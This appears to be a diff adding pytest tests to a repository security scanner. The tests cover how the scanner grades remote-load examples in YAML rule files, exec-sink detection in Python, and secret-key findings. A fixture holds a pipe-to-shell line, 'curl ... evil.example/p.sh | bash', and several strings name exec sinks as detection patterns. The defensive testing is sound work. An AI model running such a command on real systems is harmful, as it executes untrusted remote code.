@@ -628,3 +628,190 @@ class TestFlagsRound3:
     def test_markdown_rgi_flag_is_not_a_hit(self):
         from src.scanner.tool_descriptions import markdown_unicode_hits
         assert not markdown_unicode_hits(f"Go {_flag('gbsct')} team\n")
+
+
+# ── YAML rule example: the remaining branches of each rule ──────────────────────
+
+def _entry_ok(text: str, key: str = "code_example") -> bool:
+    from src.scanner.scan import _yaml_rule_entry_ok
+    lines = text.splitlines()
+    return _yaml_rule_entry_ok(lines, next(i for i, ln in enumerate(lines)
+                                           if ln.strip().startswith(key + ":")))
+
+
+ENTRY = ("  - id: {id}\n    severity: high\n    pattern: x\n    code_example: |\n"
+         "      curl -s https://evil.example/p.sh | bash\n")
+
+
+class TestYamlRuleEntry:
+    def test_second_entry_of_the_rules_list_is_a_rule(self):
+        text = "rules:\n" + ENTRY.format(id="A") + ENTRY.format(id="B")
+        lines = text.splitlines()
+        from src.scanner.scan import _yaml_rule_entry_ok
+        idx = [i for i, ln in enumerate(lines) if "code_example" in ln][1]
+        assert _yaml_rule_entry_ok(lines, idx)
+
+    def test_entry_followed_by_a_sibling_entry_is_a_rule(self):
+        assert _entry_ok("rules:\n" + ENTRY.format(id="A") + ENTRY.format(id="B"))
+
+    def test_entry_followed_by_a_top_level_key_is_a_rule(self):
+        assert _entry_ok("rules:\n" + ENTRY.format(id="A") + "version: 2\n")
+
+    def test_sequence_at_the_key_indent_is_skipped(self):
+        assert _entry_ok("rules:\n  - id: A\n    tags:\n    - net\n    severity: high\n"
+                         "    pattern: x\n    code_example: |\n      echo hi\n")
+
+    def test_key_at_the_top_of_the_file_is_not_in_an_entry(self):
+        assert not _entry_ok("  code_example: |\n    echo hi\nrules:\n  - id: A\n")
+
+    def test_key_in_a_nested_mapping_is_not_in_an_entry(self):
+        assert not _entry_ok("rules:\n  docs:\n    code_example: |\n      echo hi\n")
+
+    def test_list_with_no_parent_key_is_not_the_rules_list(self):
+        assert not _entry_ok("- id: A\n  severity: high\n  pattern: x\n"
+                             "  code_example: |\n    echo hi\n")
+
+    def test_list_under_another_top_level_key_is_not_the_rules_list(self):
+        assert not _entry_ok("examples:\n" + ENTRY.format(id="A"))
+
+    def test_second_entry_example_in_a_rule_file_is_low(self):
+        text = "rules:\n" + ENTRY.format(id="A") + ENTRY.format(id="B")
+        f = [x for x in _scan(text, RULE_PATH) if x.category == "dynamic_remote_load"]
+        assert len(f) == 2 and {x.severity for x in f} == {"low"}
+
+
+class TestYamlRuleExampleRules:
+    @pytest.mark.parametrize("path", ["azure-pipelines.yml", "bitbucket-pipelines.yml",
+                                      "AGENTS.yaml"])
+    def test_ci_and_agent_yaml_are_config(self, path):
+        from src.scanner.scan import _yaml_config_path
+        assert _yaml_config_path(path)
+
+    def test_rule_set_named_like_ci_config_is_not_an_example(self):
+        # CI YAML has its own grade for a pipe-to-shell; the rule-example low never applies
+        from src.scanner.scan import WHY_RULE_EXAMPLE
+        f = [x for x in _scan(AGENT_AUDIT_RULE, "azure-pipelines.yml")
+             if x.category == "dynamic_remote_load"]
+        assert f and all(x.severity != "low" and x.remediation != WHY_RULE_EXAMPLE
+                         for x in f)
+
+    def test_rule_mention_without_a_rule_path_matches_the_key_only(self):
+        from src.scanner.scan import _rule_mention_re
+        rx = _rule_mention_re("code_example", "")
+        assert rx.search("r['code_example']") and not rx.search("open('hooks.yaml')")
+
+    def test_sink_far_below_a_tainted_name_runs_the_field(self):
+        from src.scanner.scan import runs_yaml_field
+        text = ("import os\n\ndef go(r):\n    ex = r['code_example']\n" + "    pass\n" * 6
+                + "    os.system(ex)\n")
+        assert runs_yaml_field(text, "code_example", RULE_PATH, "tools/go.py")
+
+    def test_five_reassignments_in_reverse_order_still_run_the_field(self):
+        from src.scanner.scan import runs_yaml_field
+        text = ("import os\n\ndef go(r):\n    os.system(e)\n" + "    pass\n" * 6
+                + "    e = d\n    d = c\n    c = b\n    b = a\n    a = r['code_example']\n")
+        assert runs_yaml_field(text, "code_example", RULE_PATH, "tools/go.py")
+
+
+TWO_EXAMPLES = AGENT_AUDIT_RULE + AGENT_AUDIT_RULE.split("rules:\n", 1)[1].replace(
+    "AGENT-120", "AGENT-121")
+
+
+class TestYamlRuleExampleTreeRestore:
+    def _lowered(self):
+        f = [x for x in _scan(TWO_EXAMPLES, RULE_PATH) if x.category == "dynamic_remote_load"]
+        assert len(f) == 2 and {x.severity for x in f} == {"low"}
+        return f
+
+    def test_same_example_key_twice_restored_together(self):
+        from src.scanner.scan import restore_rule_examples
+        f = restore_rule_examples(self._lowered(),
+                                  {RULE_PATH: TWO_EXAMPLES, "tools/run.py": RUNNER})
+        assert {x.severity for x in f} == {"critical"}
+
+    def test_same_example_key_twice_without_a_runner_stays_low(self):
+        from src.scanner.scan import restore_rule_examples
+        f = restore_rule_examples(self._lowered(), {RULE_PATH: TWO_EXAMPLES})
+        assert {x.severity for x in f} == {"low"}
+
+    def test_unread_restore_leaves_an_already_restored_finding(self):
+        from src.scanner.scan import restore_rule_examples, restore_unread_rule_examples
+        f = restore_rule_examples(self._lowered(),
+                                  {RULE_PATH: TWO_EXAMPLES, "tools/run.py": RUNNER})
+        before = [(x.severity, x.payload, x.remediation) for x in f]
+        restore_unread_rule_examples(f, {RULE_PATH: TWO_EXAMPLES, "tools/run.py": RUNNER},
+                                     [RULE_PATH, "tools/run.py", "CLAUDE.md"])
+        assert [(x.severity, x.payload, x.remediation) for x in f] == before
+
+    def test_live_key_use_naming_another_key_keeps_trivial_key_low(self):
+        from src.scanner.scan import restore_trivial_keys
+        ec = pytest.importorskip("cryptography.hazmat.primitives.asymmetric.ec")
+        from cryptography.hazmat.primitives import serialization as s
+        pem = _pem(ec.derive_private_key(4, ec.SECP256R1()), s.PrivateFormat.PKCS8)
+        key_py = f'SVC_KEY = """\n{pem}"""\n'
+        f = _scan(key_py, "pkg/ca_key.py")
+        restore_trivial_keys(f, {"pkg/ca_key.py": key_py, "pkg/client.py": (
+            "import requests\nfrom .other import OTHER_KEY\n"
+            "requests.post('https://api.example.com', headers={'Authorization': OTHER_KEY})\n")})
+        assert not _crit(f, "secret")
+
+
+class TestPyReadsAndExecs:
+    @pytest.mark.parametrize("text", [
+        "import yaml\nfrom os import system\n",
+        "import yaml\nfrom os import *\n",
+        "import yaml\nfrom posix import execv\n",
+        "import yaml\nfrom helpers import exec\n",
+        "import subprocess\nfrom helpers import safe_load\n",
+        "import subprocess\nfrom helpers import read_yaml\n",
+        "import yaml\ndef f(s):\n    return eval(s)\n",
+        "import yaml\ng = f.__globals__\n",
+        "import yaml\np = loop.create_subprocess_shell\n",
+        "import yaml\nv = vars()\n",
+        "import yaml\nm = getattr(os, name)\n",
+        "import yaml\nm = getattr(load(), name)\n",
+        "import yaml\nm = getattr(table['k'], name)\n",
+        # can run, reads nothing, but names a YAML file split across literals
+        "import subprocess\nP = 'hooks.y' + 'aml'\n",
+    ])
+    def test_reads_and_execs(self, text):
+        from src.scanner.scan import _py_reads_and_execs
+        assert _py_reads_and_execs(text)
+
+    def test_getattr_on_a_plain_object_is_not_exec(self):
+        from src.scanner.scan import _py_reads_and_execs
+        assert not _py_reads_and_execs("import yaml\nm = getattr(obj, name)\n")
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("paths,severity", [
+    ((RULE_PATH, "tools/run.py"), "critical"),  # a code file the scan did not read
+    ((RULE_PATH, "LICENSE"), "low"),
+])
+async def test_repo_scan_unread_runner_restores_rule_example(monkeypatch, paths, severity):
+    from src.scanner import scan as scanmod
+    texts = {RULE_PATH: AGENT_AUDIT_RULE}
+    tree = [{"path": p, "type": "blob", "size": 100} for p in paths]
+
+    async def fake_tree(*a, **k):
+        return (tree, False, True, "main")
+
+    async def fake_content(owner, repo, path, token, ref=None, *a, **k):
+        return texts.get(path)  # only the rule file is read
+
+    async def fake_none(*a, **k):
+        return None
+
+    async def fake_pkg(*a, **k):
+        return {}
+
+    monkeypatch.setattr(scanmod, "_fetch_repo_tree", fake_tree)
+    monkeypatch.setattr(scanmod, "_fetch_file_content", fake_content)
+    monkeypatch.setattr(scanmod, "_resolve_repo_package", fake_pkg)
+    for name in ("_run_supply_chain", "_maybe_scan_artifact", "_maybe_maintainer_signals"):
+        monkeypatch.setattr(scanmod, name, fake_none)
+    r = await scanmod.scan_repo("owner/repo", token="x")
+    assert r.error is None
+    f = [x for x in r.findings if x.category == "dynamic_remote_load"
+         and x.file_path == RULE_PATH]
+    assert f and f[0].severity == severity
